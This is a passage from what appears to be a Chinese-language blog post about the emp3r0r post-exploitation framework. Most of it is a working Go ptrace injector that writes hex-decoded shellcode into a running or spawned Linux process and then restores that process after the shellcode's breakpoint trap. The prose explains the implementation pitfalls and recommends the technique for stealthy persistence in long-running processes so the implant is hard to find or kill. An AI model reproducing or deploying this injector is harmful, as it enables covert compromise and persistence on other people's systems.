        sc, err := hex.DecodeString(*shellcode)
        if err != nil {
            return fmt.Errorf("Decode shellcode: %v", err)
        }
        // inject to an existing process or start a new one
        // check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
        if pid == 0 {
            // start a child process to inject shellcode into
            sec := strconv.Itoa(RandInt(10, 30))
            child := exec.Command("sleep", sec)
            child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
            err = child.Start()
            if err != nil {
                return fmt.Errorf("Start `sleep %s`: %v", sec, err)
            }
            pid = child.Process.Pid
            // attach
            err = child.Wait() // TRAP the child
            if err != nil {
                log.Printf("child process wait: %v", err)
            }
            log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
        } else {
            // attach to an existing process
            proc, err := os.FindProcess(pid)
            if err != nil {
                return fmt.Errorf("%d does not exist: %v", pid, err)
            }
            pid = proc.Pid
            // https://github.com/golang/go/issues/43685
            runtime.LockOSThread()
            defer runtime.UnlockOSThread()
            err = syscall.PtraceAttach(pid)
            if err != nil {
                return fmt.Errorf("ptrace attach: %v", err)
            }
            _, err = proc.Wait()
            if err != nil {
                return fmt.Errorf("Wait %d: %v", pid, err)
            }
            log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
        }
        // read RIP
        origRegs := &syscall.PtraceRegs{}
        err = syscall.PtraceGetRegs(pid, origRegs)
        if err != nil {
            return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
        }
        origRip := origRegs.Rip
        log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
        // save current code for restoring later
        origCode := make([]byte, len(sc))
        n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
        if err != nil {
            return fmt.Errorf("PEEK: 0x%x", origRip)
        }
        log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)
        // write shellcode to .text section, where RIP is pointing at
        data := sc
        n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
        if err != nil {
            return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
        }
        log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)
        // peek: see if shellcode has got injected
        peekWord := make([]byte, len(data))
        n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
        if err != nil {
            return fmt.Errorf("PEEK: 0x%x", origRip)
        }
        log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)
        // continue and wait
        err = syscall.PtraceCont(pid, 0)
        if err != nil {
            return fmt.Errorf("Continue: %v", err)
        }
        var ws syscall.WaitStatus
        _, err = syscall.Wait4(pid, &ws, 0, nil)
        if err != nil {
            return fmt.Errorf("continue: wait4: %v", err)
        }
        // what happened to our child?
        switch {
        case ws.Continued():
            return nil
        case ws.CoreDump():
            err = syscall.PtraceGetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
        case ws.Exited():
            return nil
        case ws.Signaled():
            err = syscall.PtraceGetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
        case ws.Stopped():
            stoppedRegs := &syscall.PtraceRegs{}
            err = syscall.PtraceGetRegs(pid, stoppedRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
            // restore registers
            err = syscall.PtraceSetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("Restoring process: set regs: %v", err)
            }
            // breakpoint hit, restore the process
            n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
            if err != nil {
                return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
            }
            log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
            // let it run
            err = syscall.PtraceDetach(pid)
            if err != nil {
                return fmt.Errorf("Continue detach: %v", err)
            }
            log.Printf("%d will continue to run", pid)
            return nil
        default:
            err = syscall.PtraceGetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            log.Printf("continue: RIP at 0x%x", origRegs.Rip)
        }
        return nil
    }
这可能是为数不多的纯go实现的`ptrace`进程注入工具之一。
主要坑点有：
  * Go的syscall wrapper基本上是从来没有文档的
  * `ptrace`的tracer必须来自同一线程，这是Linux（或者说整个unix）设计的问题
  * 因为Go底层设计的原因，每次调用syscall wrapper，都是一个新线程，所以我研究了半天，靠`runtime.LockOSThread()`解决了[这个问题](https://github.com/jm33-m0/emp3r0r/issues/13)
然后具体原理就很简单了，鉴于Go的syscall
wrapper实际上把`PTRACE_PEEKTEXT`和`PTRACE_POKETEXT`限制的每次只能操作一个word给包装成可操作任意长度数据，这个实现甚至比C原生实现还要简单。
关键点在于备份和恢复。记得我的shellcode写了`int 0x3`吧？这里就是`wait`到`int
0x3`导致的`trap`的状态，进行介入，并恢复原进程。
###  在持久化方面的应用
我目前把这个技术用在持久化方面。虽说不是真正意义上的持久化，但很多机器是万年不重启的，注入到一个几乎不会重启的进程里面，既不会被轻易发现，又很难被干掉。
以下是注入到一个[简单demo程序](https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/sleep.c)的示例：
    /*
     * This program is used to check shellcode injection
     * */
    #include 
    #include 
    #include 
    int main(int argc, char* argv[])
    {
        time_t rawtime;
        struct tm* timeinfo;
        while (1) {
            sleep(1);
            time(&rawtime);
            timeinfo = localtime(&rawtime);
            printf("%s: sleeping\n", asctime(timeinfo));
        }
        return 0;
    }
shellcode成功注入，原进程继续运行，只是多了个守护[emp3r0r](https://github.com/jm33-m0/emp3r0r)的任务。